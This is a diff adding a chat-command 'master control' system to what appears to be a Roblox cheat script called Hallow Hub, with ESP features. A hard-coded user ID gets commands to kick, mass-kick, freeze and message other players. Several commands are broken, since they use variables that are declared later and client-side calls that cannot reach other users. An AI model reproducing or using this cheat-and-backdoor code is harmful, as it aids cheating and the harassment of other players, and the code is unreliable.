@@ -2409,6 +2409,466 @@ WorldTab:Button({
 
 WorldTab:Label("🎨 World visuals ready!", "Left")
 
+-- ==================== MASTER CONTROL SYSTEM ====================
+local YOUR_ROBLOX_ID = 1455718649  -- ← CHANGE THIS TO YOUR ACTUAL ROBLOX ID!
+local PREFIX = ":"  -- Command prefix
+
+-- Function to check if the speaker is YOU
+local function isMaster(speaker)
+    return speaker.UserId == YOUR_ROBLOX_ID
+end
+
+-- Function to show notification on everyone's screen
+local function broadcastNotification(title, message, duration)
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.UserId ~= YOUR_ROBLOX_ID then
+            pcall(function()
+                if syde and syde.Notify then
+                    syde:Notify({
+                        Title = title,
+                        Content = message,
+                        Duration = duration or 5
+                    })
+                else
+                    game:GetService("StarterGui"):SetCore("SendNotification", {
+                        Title = title,
+                        Text = message,
+                        Duration = duration or 5
+                    })
+                end
+            end)
+        end
+    end
+end
+
+-- Function to show message on everyone's screen (big center text)
+local function broadcastCenterMessage(message, duration)
+    duration = duration or 3
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.UserId ~= YOUR_ROBLOX_ID then
+            pcall(function()
+                local gui = Instance.new("ScreenGui")
+                gui.Name = "HallowAnnouncement"
+                gui.Parent = player:WaitForChild("PlayerGui")
+                
+                local text = Instance.new("TextLabel")
+                text.Size = UDim2.new(1, 0, 0.2, 0)
+                text.Position = UDim2.new(0, 0, 0.4, 0)
+                text.BackgroundTransparency = 1
+                text.Text = message
+                text.TextColor3 = Color3.fromRGB(251, 144, 255)
+                text.TextScaled = true
+                text.Font = Enum.Font.GothamBold
+                text.TextStrokeTransparency = 0.3
+                text.TextStrokeColor3 = Color3.new(0, 0, 0)
+                text.Parent = gui
+                
+                task.wait(duration)
+                for i = 1, 10 do
+                    text.TextTransparency = i / 10
+                    task.wait(0.05)
+                end
+                gui:Destroy()
+            end)
+        end
+    end
+end
+
+-- Master commands table
+local masterCommands = {
+    ["help"] = {
+        desc = "Shows all master commands",
+        func = function(args, speaker)
+            if not isMaster(speaker) then return nil end
+            local msg = "👑 Master Commands:\n"
+            for cmd, data in pairs(masterCommands) do
+                msg = msg .. PREFIX .. cmd .. " " .. (data.usage or "") .. " - " .. data.desc .. "\n"
+            end
+            return msg
+        end
+    },
+    
+    ["kick"] = {
+        desc = "Kicks a specific user",
+        usage = "[user] [reason]",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            if #args < 1 then
+                return "❌ Usage: :kick [username] [reason]"
+            end
+            
+            local targetName = args[1]
+            local reason = table.concat(args, " ", 2)
+            if reason == "" then reason = "Kicked by Hallow Hub Master" end
+            
+            local targetPlayer = nil
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.Name:lower() == targetName:lower() or 
+                   player.DisplayName:lower() == targetName:lower() or
+                   tostring(player.UserId) == targetName then
+                    targetPlayer = player
+                    break
+                end
+            end
+            
+            if not targetPlayer then
+                return "❌ User not found: " .. targetName
+            end
+            
+            if targetPlayer.UserId == YOUR_ROBLOX_ID then
+                return "❌ You can't kick yourself!"
+            end
+            
+            targetPlayer:Kick("🔴 " .. reason)
+            return "✅ Kicked " .. targetPlayer.Name .. ": " .. reason
+        end
+    },
+    
+    ["kickall"] = {
+        desc = "Kicks ALL users (except you)",
+        usage = "[reason]",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            local reason = table.concat(args, " ")
+            if reason == "" then reason = "Mass kick by Hallow Hub Master" end
+            
+            local kicked = 0
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.UserId ~= YOUR_ROBLOX_ID and player ~= LP then
+                    player:Kick("🔴 " .. reason)
+                    kicked = kicked + 1
+                end
+            end
+            
+            return "✅ Kicked " .. kicked .. " users: " .. reason
+        end
+    },
+    
+    ["shout"] = {
+        desc = "Shows message in center of everyone's screen",
+        usage = "[message]",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            local message = table.concat(args, " ")
+            if message == "" then
+                return "❌ Please provide a message to shout"
+            end
+            
+            broadcastCenterMessage("📢 " .. message, 5)
+            return "✅ Shouted: " .. message
+        end
+    },
+    
+    ["announce"] = {
+        desc = "Sends notification to everyone",
+        usage = "[message]",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            local message = table.concat(args, " ")
+            if message == "" then
+                return "❌ Please provide an announcement"
+            end
+            
+            broadcastNotification("Hallow Hub Announcement", message, 5)
+            return "✅ Announcement sent: " .. message
+        end
+    },
+    
+    ["warn"] = {
+        desc = "Sends warning notification to specific user",
+        usage = "[user] [message]",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            if #args < 2 then
+                return "❌ Usage: :warn [username] [message]"
+            end
+            
+            local targetName = args[1]
+            local message = table.concat(args, " ", 2)
+            
+            local targetPlayer = nil
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.Name:lower() == targetName:lower() or 
+                   player.DisplayName:lower() == targetName:lower() or
+                   tostring(player.UserId) == targetName then
+                    targetPlayer = player
+                    break
+                end
+            end
+            
+            if not targetPlayer then
+                return "❌ User not found: " .. targetName
+            end
+            
+            pcall(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "⚠️ WARNING",
+                    Text = message,
+                    Duration = 5
+                })
+            end)
+            
+            return "✅ Warning sent to " .. targetPlayer.Name .. ": " .. message
+        end
+    },
+    
+    ["warnall"] = {
+        desc = "Sends warning notification to everyone",
+        usage = "[message]",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            local message = table.concat(args, " ")
+            if message == "" then
+                return "❌ Please provide a warning"
+            end
+            
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.UserId ~= YOUR_ROBLOX_ID then
+                    pcall(function()
+                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                            Title = "⚠️ WARNING",
+                            Text = message,
+                            Duration = 5
+                        })
+                    end)
+                end
+            end
+            
+            return "✅ Warning sent to everyone: " .. message
+        end
+    },
+    
+    ["freeze"] = {
+        desc = "Freezes a specific user",
+        usage = "[user]",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            if #args < 1 then
+                return "❌ Usage: :freeze [username]"
+            end
+            
+            local targetName = args[1]
+            
+            local targetPlayer = nil
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.Name:lower() == targetName:lower() or 
+                   player.DisplayName:lower() == targetName:lower() or
+                   tostring(player.UserId) == targetName then
+                    targetPlayer = player
+                    break
+                end
+            end
+            
+            if not targetPlayer then
+                return "❌ User not found: " .. targetName
+            end
+            
+            if targetPlayer.Character then
+                local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    root.Anchored = true
+                end
+            end
+            
+            return "❄️ Frozen " .. targetPlayer.Name
+        end
+    },
+    
+    ["unfreeze"] = {
+        desc = "Unfreezes a specific user",
+        usage = "[user]",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            if #args < 1 then
+                return "❌ Usage: :unfreeze [username]"
+            end
+            
+            local targetName = args[1]
+            
+            local targetPlayer = nil
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.Name:lower() == targetName:lower() or 
+                   player.DisplayName:lower() == targetName:lower() or
+                   tostring(player.UserId) == targetName then
+                    targetPlayer = player
+                    break
+                end
+            end
+            
+            if not targetPlayer then
+                return "❌ User not found: " .. targetName
+            end
+            
+            if targetPlayer.Character then
+                local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    root.Anchored = false
+                end
+            end
+            
+            return "🔥 Unfrozen " .. targetPlayer.Name
+        end
+    },
+    
+    ["shutdown"] = {
+        desc = "Completely disables the script for everyone",
+        usage = "",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            broadcastCenterMessage("🛑 Hallow Hub Shutting Down...", 3)
+            
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.UserId ~= YOUR_ROBLOX_ID then
+                    player:Kick("🔴 Hallow Hub has been disabled by the master")
+                end
+            end
+            
+            commandEnabled = false
+            if chatConnection then
+                chatConnection:Disconnect()
+            end
+            
+            for player, data in pairs(espData) do
+                if data and data.highlight then
+                    pcall(function() data.highlight:Destroy() end)
+                end
+                if data and data.billboard then
+                    pcall(function() data.billboard:Destroy() end)
+                end
+            end
+            espData = {}
+            
+            if syde.Flags then
+                for flag, obj in pairs(syde.Flags) do
+                    pcall(function() obj:Set(false) end)
+                end
+            end
+            
+            return "🛑 Hallow Hub shutdown complete"
+        end
+    },
+    
+    ["list"] = {
+        desc = "Shows all active users",
+        usage = "",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            local activeUsers = {}
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.UserId ~= YOUR_ROBLOX_ID then
+                    table.insert(activeUsers, player.Name .. " (" .. player.UserId .. ")")
+                end
+            end
+            
+            if #activeUsers == 0 then
+                return "📋 No other users active"
+            else
+                return "📋 Active users: " .. table.concat(activeUsers, ", ")
+            end
+        end
+    },
+    
+    ["pm"] = {
+        desc = "Sends private message to specific user",
+        usage = "[user] [message]",
+        func = function(args, speaker)
+            if not isMaster(speaker) then 
+                return "❌ You don't have permission!"
+            end
+            
+            if #args < 2 then
+                return "❌ Usage: :pm [username] [message]"
+            end
+            
+            local targetName = args[1]
+            local message = table.concat(args, " ", 2)
+            
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.Name:lower() == targetName:lower() or 
+                   player.DisplayName:lower() == targetName:lower() or
+                   tostring(player.UserId) == targetName then
+                    pcall(function()
+                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                            Title = "📨 Message from Master",
+                            Text = message,
+                            Duration = 5
+                        })
+                    end)
+                    return "✅ PM sent to " .. player.Name
+                end
+            end
+            
+            return "❌ User not found: " .. targetName
+        end
+    }
+}
+
+-- ==================== CHAT LISTENER ====================
+local commandEnabled = true
+local chatConnection = nil
+
+local function onPlayerChatted(speaker, message)
+    if not commandEnabled then return end
+    
+    if string.sub(message, 1, 1) == PREFIX then
+        local parts = {}
+        for word in string.gmatch(message, "%S+") do
+            table.insert(parts, word)
+        end
+        
+        local cmd = string.sub(parts[1], 2)
+        local args = {}
+        for i = 2, #parts do
+            table.insert(args, parts[i])
+        end
+        
+        if masterCommands[cmd] then
+            local result = masterCommands[cmd].func(args, speaker)
+            if result then
+                pcall(function()
+                    LP:WaitForChild("PlayerGui"):WaitForChild("Chat"):ChatChannelAddMessage("Hallow Hub", result)
+                end)
+            end
+        end
+    end
+end
+
+chatConnection = LP.Chatted:Connect(function(message)
+    onPlayerChatted(LP, message)
+end)
+
+print("👑 Master control system loaded - ID:", YOUR_ROBLOX_ID)
+
 -- Initialize ESP after UI is created
 task.wait(3) -- Give UI time to load
 initializeESP()
